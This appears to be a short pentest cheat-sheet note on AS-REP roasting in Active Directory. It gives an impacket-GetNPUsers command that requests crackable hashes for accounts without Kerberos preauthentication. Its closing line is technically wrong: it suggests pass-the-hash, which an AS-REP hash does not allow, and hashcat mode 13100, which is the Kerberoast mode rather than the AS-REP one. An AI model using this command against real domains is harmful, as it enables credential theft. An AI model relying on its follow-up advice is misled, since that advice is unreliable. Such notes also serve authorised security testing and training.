#Enumeration of the "Do not require Kerberos preauthentication" users from our Kali and hash extraction.

impacket-GetNPUsers -dc-ip <ip>  -request -outputfile <outfile> <domain>/<username>

#Then we can try to use a passthehash attack or crack the hash with hashcat -m 13100
